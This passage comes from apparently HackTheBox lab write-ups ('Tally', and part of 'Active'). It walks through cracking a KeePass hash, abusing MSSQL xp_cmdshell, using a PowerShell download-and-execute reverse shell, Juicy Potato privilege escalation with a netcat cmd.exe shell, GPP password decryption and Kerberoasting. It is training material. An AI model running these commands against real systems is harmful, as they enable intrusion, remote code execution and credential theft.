4 m4rc0ff m4rc0ff 4096 May 19 09:16 KeePass-2.36 -rw-r--r-- 1 m4rc0ff m4rc0ff 2222 Sep 15 2017 tim.kdbx the tim.kdbx is a keePass file as confirmed below: m4rc0ff@SittingDucks:~/Documents/htbBoxes/tally/ftpFiles/User/Tim/Files$ file tim.kdbx tim.kdbx: Keepass password database 2.x KDBX To convert this to an hash we can use keepass2john : m4rc0ff@SittingDucks:~/Documents/htbBoxes/tally/ftpFiles/User/Tim/Files$ keepass2john tim.kdbx tim:$keepass$ *2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da Then we can use hashcat to crack the hash. Before doing so I check the hashcat official wiki and grab the hash-mode for keepass, that is 13400 . Then I put the hash in a file and launch the below command to brute force the hash: m4rc0ff@SittingDucks:~/Documents/htbBoxes/tally$ hashcat -m 13400 timKeePassHash /usr/share/wordlists/rockyou.txt --force hashcat (v5.1.0) starting... <SNIP> $ keepass $* 2 *6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementeyo Session..........: hashcat Status...........: Cracked Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES) Hash.Target......: $keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd2...1cd7da Time.Started.....: Tue May 19 20:41:06 2020 (13 secs) Time.Estimated...: Tue May 19 20:41:19 2020 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1938 H/s (10.67ms) @ Accel:512 Loops:128 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 25600/14344385 (0.18%) Rejected.........: 0/25600 (0.00%) Restore.Point....: 24576/14344385 (0.17%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:5888-6000 Candidates.#1....: 280690 -> johnnyd Started: Tue May 19 20:40:54 2020 Stopped: Tue May 19 20:41:20 2020 So the password is simplementeyo . Using Keepass2 client we can open the tim.kdbx file and we should be able to login with the password we found: Once in, I found a password for the \"TALLY ACCT SHARE\". If you remember from the nmap output the smb ports are open so we can try to login to the share using the credentials we just found: m4rc0ff@SittingDucks:~$ smbclient //10.10.10.59/ACCT -U Finance Enter WORKGROUP\\Finance's password: Try \"help\" to get a list of possible commands. smb: \\> ls . D 0 Mon Sep 18 06:58:18 2017 .. D 0 Mon Sep 18 06:58:18 2017 Customers D 0 Sun Sep 17 21:28:40 2017 Fees D 0 Mon Aug 28 22:20:52 2017 Invoices D 0 Mon Aug 28 22:18:19 2017 Jess D 0 Sun Sep 17 21:41:29 2017 Payroll D 0 Mon Aug 28 22:13:32 2017 Reports D 0 Fri Sep 1 21:50:11 2017 Tax D 0 Sun Sep 17 21:45:47 2017 Transactions D 0 Wed Sep 13 20:57:44 2017 zz_Archived D 0 Fri Sep 15 21:29:35 2017 zz_Migration D 0 Sun Sep 17 21:49:13 2017 8387839 blocks of size 4096. 449367 blocks available More directories to dig through! Took me a while but I found some SQL credentials into the xx_Archived directory: smb: \\zz_Archived\\SQL\\> ls . D 0 Fri Sep 15 21:29:36 2017 .. D 0 Fri Sep 15 21:29:36 2017 conn-info.txt A 77 Sun Sep 17 21:26:56 2017 8387839 blocks of size 4096. 448720 blocks available smb: \\zz_Archived\\SQL\\> get conn-info.txt getting file \\zz_Archived\\SQL\\conn-info.txt of size 77 as conn-info.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec) The conn-info.txt has the credentials: m4rc0ff@SittingDucks:~/Documents/htbBoxes/tally$ cat conn-info.txt old server details db: sa pass: YE%TJC%&HYbe5Nw nmap showed an SQL server running, let's see if we can login using sqsh : m4rc0ff@SittingDucks:~$ sqsh -S 10 .10.10.59 -U sa sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp This is free software with ABSOLUTELY NO WARRANTY For more information type '\\warranty' Password: Login failed for user 'sa'. Password: The login wasn't successful so maybe it's just a rabbit hole. I get back to recon and resume where I left, that is the zz_migration directory: smb: \\zz_migration\\Binaries\\New folder\\> ls . D 0 Thu Sep 21 07:21:09 2017 .. D 0 Thu Sep 21 07:21:09 2017 crystal_reports_viewer_2016_sp04_51051980.zip A 389188014 Wed Sep 13 20:56:38 2017 Macabacus2016.exe A 18159024 Mon Sep 11 22:20:05 2017 Orchard.Web.1.7.3.zip A 21906356 Wed Aug 30 00:27:42 2017 putty.exe A 774200 Sun Sep 17 21:19:26 2017 RpprtSetup.exe A 483824 Fri Sep 15 20:49:46 2017 tableau-desktop-32bit-10-3-2.exe A 254599112 Mon Sep 11 22:13:14 2017 tester.exe A 215552 Fri Sep 1 12:15:54 2017 vcredist_x64.exe A 7194312 Wed Sep 13 21:06:28 2017 8387839 blocks of size 4096. 448524 blocks available In there there is an exe which is dubbed tester.exe and as such it is interesting with respect to the others since it seems a custom created file. After getting the file in my box, a basic analysis of the executable with strings reveals something interesting: <SNIP> WVS3 <$Xf &#94;_[3 SQLSTATE: Message: DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G; select * from Orchard_Users_UserPartRecord Unknown exception bad cast bad locale name false <SNIP> From the above we can see that the tester does some kind of call to a db utilizing the following credentials: UID= sa PWD= GWE3V65#6KFH93@4GWTG2G Let's check again if these credentials work with sqsh : m4rc0ff@SittingDucks:~$ sqsh -S 10 .10.10.59 -U sa sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp This is free software with ABSOLUTELY NO WARRANTY For more information type '\\warranty' Password: 1> This time we are in! MSSQL has a shell we can use to run commands, that is xp_cmdshell : 1> xp_cmdshell 'whoami' 2> go outputtally\\sarah NULL (2 rows affected, return status = 0) running the whoami command as shown above command shows the user sarah we had previously seen in the FTP direcories. The output is quite weird so we better get a proper shell back. To do that I prepare a nishang TCP reverse shell available in my kali box at /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 . To activate the shell I add the following string at the end to call the Invoke-PowerShellTcp function: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 443 Then I host the shell, which I renamed shell.ps1, on a python simple http server and I start a netcat listner on port 443. Now I can call the shell from the xp_cmdshell as follow: 1> xp_cmdshell \"powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/shell.ps1')\" 2> go Msg 15281, Level 16, State 1 Server 'TALLY', Procedure 'xp_cmdshell', Line 1 SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online. 1> Even though we were able to run whoami before now is giving us errors, not sure why to be honest. However I found the below commands to reconfigure and reactivate the shell: 1> EXEC SP_CONFIGURE 'show advanced options',1 2> reconfigure 3> go Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. (return status = 0) 1> exec sp_configure 'xp_cmdshell',1 2> reconfigure 3> go Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install. (return status = 0) One this is done I try again: 1> xp_cmdshell \"powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/shell.ps1')\" 2> go no errors this time, and indeed I get the shell: m4rc0ff@SittingDucks:~$ sudo nc -lnvp 443 [sudo] password for m4rc0ff: listening on [any] 443 ... connect to [10.10.14.15] from (UNKNOWN) [10.10.10.59] 57196 Windows PowerShell running as user Sarah on TALLY Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32>whoami tally\\sarah Running systeminfo shows we are dealing with a Windows Server 2016: PS C:\\users\\sarah\\desktop> systeminfo Host Name: TALLY OS Name: Microsoft Windows Server 2016 Standard OS Version: 10.0.14393 N/A Build 14393 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00376-30726-67778-AA877 Original Install Date: 28/08/2017, 15:43:34 System Boot Time: 18/05/2020, 21:37:00 System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-gb;English (United Kingdom) Input Locale: en-gb;English (United Kingdom) Time Zone: (UTC+00:00) Dublin, Edinburgh, Lisbon, London Total Physical Memory: 2,047 MB Available Physical Memory: 172 MB Virtual Memory: Max Size: 4,907 MB Virtual Memory: Available: 764 MB Virtual Memory: In Use: 4,143 MB Page File Location(s): C:\\pagefile.sys Domain: HTB.LOCAL Logon Server: \\\\TALLY Hotfix(s): 2 Hotfix(s) Installed. [01]: KB3199986 [02]: KB4015217 Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) 82574L Gigabit Network Connection Connection Name: Ethernet0 DHCP Enabled: No IP address(es) [01]: 10.10.10.59 [02]: fe80::9ae:129:54ea:ab30 [03]: dead:beef::9ae:129:54ea:ab30 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. We can also see that the SeImpersonatePrivilege is enabled: PS C:\\Windows\\system32> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled This means we can use Juicy Potato so I download it to the box: PS C:\\users\\sarah\\desktop> certutil -urlcache -split -f http://10.10.14.15/JuicyPotato.exe jp.exe **** Online **** 000000 ... 052e00 CertUtil: -URLCache command completed successfully. I also download a 64 bit version of netcat: PS C:\\users\\sarah\\desktop> certutil -urlcache -split -f http://10.10.14.15/nc64.exe nc.exe **** Online **** 0000 ... b0d8 CertUtil: -URLCache command completed successfully. Then I ran the exploit: PS C:\\users\\sarah\\desktop> ./jp.exe -l 1234 -t * -p nc.exe -a \"-e cmd.exe 10.10.14.15 4444\" -c \"{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}\" Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1234 ...... [+] authresult 0 {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK m4rc0ff@SittingDucks:~$ sudo nc -lnvp 4444 listening on [any] 4444 ... connect to [10.10.14.15] from (UNKNOWN) [10.10.10.59] 57353 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system C:\\Windows\\system32>type C:\\users\\administrator\\desktop\\root.txt type C:\\users\\administrator\\desktop\\root.txt 60****************************da","tags":"blogging","loc":"https://sittingducks.io/Tally.html","title":"Tally"},{"url":"https://sittingducks.io/Active.html","text":"Active is a very good box to practice pentesting on Active Directory. Particularly interesting is the Kerberoasting attack. I strongly suggest to have a read about how Kerberos work in order to understand the attack in question. Few scripts from the impacket framework are used throughout the write-up to accomplish the kerberoasting attack. Recon m4rc0ff@SittingDucks:~$ nmap -sV -sC 10 .10.10.100 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-22 11:19 BST Nmap scan report for 10.10.10.100 Host is up (0.100s latency). Not shown: 983 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-22 10:17:50Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: -1m52s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-05-22T10:18:47 |_ start_date: 2020-05-22T10:02:42 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 199.57 seconds nmap reveals that there is a DNS server running on a Windows 2008 R2 SP1 box. The output shows quite few ports are opened. We see DNS + ldap + kerberos ports so looks like we are dealing with Active directory, if it wasn't already clear from the box name. The ldap string shows the domain name is \"active.htb\" so I will add this to my /etc/hosts file. We can also see the SMB ports (139, 445) are opened amongst the other ones so we will try to do some SMB enumeration. m4rc0ff@SittingDucks:~$ smbmap -H 10 .10.10.100 [!] Authentication error on 10.10.10.100 smbmap outputs an authentication error for some reasons so I try smbclient to list ( -L ) the SMB shares available and I speficy anonymous authentication ( -N ): m4rc0ff@SittingDucks:~$ smbclient -L 10 .10.10.100 -N Anonymous login successful Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk SMB1 disabled -- no workgroup available So we get a list of shares but we don't know exactly which one allows for anonymous authentication. smbmap is very useful on that matter as it would show which share you can access but since I got an error then I guessed the share in question is Replication because it looks a non-defaualt one. m4rc0ff@SittingDucks:~$ smbclient //10.10.10.100/replication -N Anonymous login successful Try \"help\" to get a list of possible commands. smb: \\> ls . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 active.htb D 0 Sat Jul 21 11:37:44 2018 10459647 blocks of size 4096. 4925086 blocks available smb: \\> Indeed, as shown above I am able to access the share and see the content. To have a look at content of all subdirectories at once I will launch the following command which includes a recursive listing: sittingDucks:~$ smbclient //10.10.10.100/Replication -N -c 'recurse;ls' Anonymous login successful . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 active.htb D 0 Sat Jul 21 11:37:44 2018 \\active.htb . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 DfsrPrivate DHS 0 Sat Jul 21 11:37:44 2018 Policies D 0 Sat Jul 21 11:37:44 2018 scripts D 0 Wed Jul 18 19:48:57 2018 \\active.htb\\DfsrPrivate . DHS 0 Sat Jul 21 11:37:44 2018 .. DHS 0 Sat Jul 21 11:37:44 2018 ConflictAndDeleted D 0 Wed Jul 18 19:51:30 2018 Deleted D 0 Wed Jul 18 19:51:30 2018 Installing D 0 Wed Jul 18 19:51:30 2018 \\active.htb\\Policies . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9} D 0 Sat Jul 21 11:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9} D 0 Sat Jul 21 11:37:44 2018 \\active.htb\\scripts . D 0 Wed Jul 18 19:48:57 2018 .. D 0 Wed Jul 18 19:48:57 2018 \\active.htb\\DfsrPrivate\\ConflictAndDeleted . D 0 Wed Jul 18 19:51:30 2018 .. D 0 Wed Jul 18 19:51:30 2018 \\active.htb\\DfsrPrivate\\Deleted . D 0 Wed Jul 18 19:51:30 2018 .. D 0 Wed Jul 18 19:51:30 2018 \\active.htb\\DfsrPrivate\\Installing . D 0 Wed Jul 18 19:51:30 2018 .. D 0 Wed Jul 18 19:51:30 2018 \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9} . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 GPT.INI A 23 Wed Jul 18 21:46:06 2018 Group Policy D 0 Sat Jul 21 11:37:44 2018 MACHINE D 0 Sat Jul 21 11:37:44 2018 USER D 0 Wed Jul 18 19:49:12 2018 \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9} . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 GPT.INI A 22 Wed Jul 18 19:49:12 2018 MACHINE D 0 Sat Jul 21 11:37:44 2018 USER D 0 Wed Jul 18 19:49:12 2018 \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 GPE.INI A 119 Wed Jul 18 21:46:06 2018 \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 Microsoft D 0 Sat Jul 21 11:37:44 2018 Preferences D 0 Sat Jul 21 11:37:44 2018 Registry.pol A 2788 Wed Jul 18 19:53:45 2018 \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\USER . D 0 Wed Jul 18 19:49:12 2018 .. D 0 Wed Jul 18 19:49:12 2018 \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 Microsoft D 0 Sat Jul 21 11:37:44 2018 \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\USER . D 0 Wed Jul 18 19:49:12 2018 .. D 0 Wed Jul 18 19:49:12 2018 \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 Windows NT D 0 Sat Jul 21 11:37:44 2018 \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 Groups D 0 Sat Jul 21 11:37:44 2018 \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 Windows NT D 0 Sat Jul 21 11:37:44 2018 \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 SecEdit D 0 Sat Jul 21 11:37:44 2018 \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 Groups.xml A 533 Wed Jul 18 21:46:06 2018 \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 SecEdit D 0 Sat Jul 21 11:37:44 2018 \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 GptTmpl.inf A 1098 Wed Jul 18 19:49:12 2018 \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit . D 0 Sat Jul 21 11:37:44 2018 .. D 0 Sat Jul 21 11:37:44 2018 GptTmpl.inf A 3722 Wed Jul 18 19:49:12 2018 10459647 blocks of size 4096. 4925070 blocks available Groups.xml is a Group Policy file which may contain local account information which can lead us to accessing the box. smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\> get Groups.xml getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml of size 533 as Groups.xml (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec) So I download the file with the above get command and I have a look at it locally: m4rc0ff@SittingDucks:~/Documents/htbBoxes/active$ cat Groups.xml <?xml version=\"1.0\" encoding=\"utf-8\"?> <Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"><User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"><Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/></User> </Groups> We can see a domain\\username active.htb\\SVC_TGS and its password edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ , however the latter is encrypted. To decrypt it we can use a tool dubbed gpp-decrypt available in Kali: m4rc0ff@SittingDucks:~/Documents/htbBoxes/active$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ /usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated GPPstillStandingStrong2k18 Finally we have the password in clear for the user, that is GPPstillStandingStrong2k18 . Now that we have the credentials we can try smbmap again to list the shares, hopefully we won't get the authentication error again: m4rc0ff@SittingDucks:~$ smbmap -H 10 .10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 [+] IP: 10.10.10.100:445 Name: active.htb Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON READ ONLY Logon server share Replication READ ONLY SYSVOL READ ONLY Logon server share Users READ ONLY There is a Users share which looks interesting because it may be C:\\Users . Let's connect to it an check: m4rc0ff@SittingDucks:~$ smbclient //10.10.10.100/Users -U SVC_TGS Enter WORKGROUP\\SVC_TGS's password: Try \"help\" to get a list of possible commands. smb: \\> ls . DR 0 Sat Jul 21 15:39:20 2018 .. DR 0 Sat Jul 21 15:39:20 2018 Administrator D 0 Mon Jul 16 11:14:21 2018 All Users DHS 0 Tue Jul 14 06:06:44 2009 Default DHR 0 Tue Jul 14 07:38:21 2009 Default User DHS 0 Tue Jul 14 06:06:44 2009 desktop.ini AHS 174 Tue Jul 14 05:57:55 2009 Public DR 0 Tue Jul 14 05:57:55 2009 SVC_TGS D 0 Sat Jul 21 16:16:32 2018 10459647 blocks of size 4096. 4892166 blocks available smb: \\> cd SVC_TGS smb: \\SVC_TGS\\> ls . D 0 Sat Jul 21 16:16:32 2018 .. D 0 Sat Jul 21 16:16:32 2018 Contacts D 0 Sat Jul 21 16:14:11 2018 Desktop D 0 Sat Jul 21 16:14:42 2018 Downloads D 0 Sat Jul 21 16:14:23 2018 Favorites D 0 Sat Jul 21 16:14:44 2018 Links D 0 Sat Jul 21 16:14:57 2018 My Documents D 0 Sat Jul 21 16:15:03 2018 My Music D 0 Sat Jul 21 16:15:32 2018 My Pictures D 0 Sat Jul 21 16:15:43 2018 My Videos D 0 Sat Jul 21 16:15:53 2018 Saved Games D 0 Sat Jul 21 16:16:12 2018 Searches D 0 Sat Jul 21 16:16:24 2018 10459647 blocks of size 4096. 4888993 blocks available smb: \\SVC_TGS\\> cd Desktop smb: \\SVC_TGS\\Desktop\\> dir . D 0 Sat Jul 21 16:14:42 2018 .. D 0 Sat Jul 21 16:14:42 2018 user.txt A 34 Sat Jul 21 16:06:25 2018 10459647 blocks of size 4096. 4887268 blocks available smb: \\SVC_TGS\\Desktop\\> get user.txt getting file \\SVC_TGS\\Desktop\\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\SVC_TGS\\Desktop\\> Indeed, the suspition was correct and the Users shared was C:/Users so I was able to find and download the user.txt flag. m4rc0ff@SittingDucks:~/Documents/htbBoxes/active$ cat user.txt 86****************************83 If we try the same process for the root.txt flag we will see we don't have permissions to access the Administrator user Desktop: smb: \\Administrator\\> cd Desktop cd \\Administrator\\Desktop\\: NT_STATUS_ACCESS_DENIED Kerberoasting Kerberos is an established authentication protocol which has been out for quite a while. It is heavily used on Windows but can be also used in Linux. The idea behind kerberos is that when a client needs to access a particular service, it makes a request to the DC (Domain Controller) requesting a TGT (Ticket Granting Ticket), the DC validates the request and if everything checks out then it releases the TGT. The client then requests a TGS (Ticket Granting Service) and the DC replies back with it. At this point the client can use the TGS to access a particular application in the domain. The Kerberoasting attack consists on stealing the TGS and extract the password (used to access the service) it contains using brute-force. Let's see this in practice: We can now use the below impacket-GetUserSPNs script from the impacket framework to get the user SPN (Service Principal Name) m4rc0ff@SittingDucks:~$ impacket-GetUserSPNs -request -dc-ip 10 .10.10.100 active.htb/SVC_TGS -save -outputfile UserSPNs.out /usr/share/doc/python3-impacket/examples/GetUserSPNs.py:438: SyntaxWarning: \"is\" with a literal. Did you mean \"==\"? if userDomain is '': Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 20:06:40.351723 2018-07-30 18:17:40.656520 if we look at the output file we can also see we got the TGT: m4rc0ff@SittingDucks:~$ cat UserSPNs.out $ krb5tgs $23$* Administrator $ACTIVE .HTB $active /CIFS~445* $e7d1aaeab1d15b9f580ac541730fc7a7$42 c4e2f8f77a818dfa8b88b8ed54a89c1a84c36d60b01f90f65efb71b709260a856eff3c4f1858c07fa637cf22621648dd996d6e95b0c8a84a9d68483939da6a122f1a98d6f6e8c601719515f3951c383dd4fc311067f5e1003ecbd6eeb9a80a9f22a621a12c128e8763755d000d4dac4e3caa00ed4e0a0e2c8f603b0f3cbe85a7f755a9cc51bef72cceac934fd64d61de350170a7fadb686f361fe8d0b949733d1ebf87a22ecb7fe7c1a8912bbf69b32665f8d55523e8078e1a4b0e314a52bfda7785514bc77a97c6ac2ce6c04efff310cb095d1edc75925608a3dde886474ba05c2902db8e8a767a732edad05f65b5ed5f876fb70a1870ca2797d8938dae38e66a8092d99b403761f68e23a0f989e486a39456cfdc07cc36340f8da30061c6ed3c53e7060f5368ec945fcc3adfbbd83ddd7b28c339bde70c4f80c4f1c3fca28bc38f7a720ea206b3b434991737b25e931c3b6c7bd50adfb7eb5f99f904423383f5f30562bc9e8700a94b31c0830d7516f8f6ed7d2411083a5fb1a3ef074064364a11e0e4a3b3bc7766e3ae74a4a13f01052e19fe8a010acffd0c0c994560ddb23c7b726a3ea74d518dce6d172e30941c793668aa4b257020ec8d589edfe5edad9e156d1fb39d8adef8d9b95f19629c3b27aba285ee5f8c453bab8bf2f8f7b202fd176d059d34960e05e1a6c242bf510505cda9ca25a5f1d2029981beafc561b1bb141bcbfcf8a89cf7444211357a241370835de474a4aac083a1d71b18f830ced2255326e018832577106d6cdd4e4c0fd88cb5729944168937f6b314e32b1a353953c8d8aa8dcec06d8d2a356b28cc17f55f0a9503ed3678c1c7c6ca7b7d950c0ce92a2c4fc7685c99c2f4aec07ffdbbddefa761691d43ec108506874976e059c847de84dfce0fe17d9fe151a14dc18c2d474e0c3680b0274981929bd0d994d2cb40e1d74f17a794f6101af5161b21ec1920317ffb9583598380d069412defccf3093ec63a9243ccb48f327ce7c7a9dc713db98c2588f28336262f8b331178eacb56f3f412e674ec1de244460514e0c90fd8a35e9cf7ab931370a4d26806f8b36c902cdbf9bd31b100912bf910986c7560a854d07a94c96246d0b6aec484cfc09c2fdc38c0aa07061dc21617bfc2c3a8c1c29b58f8df1d4105131c7b0d46e0564292c1236b64a097f3d9b9bdba499370bf57ddbfe4e4149dfa1aa95345480e087f982afee87d98be5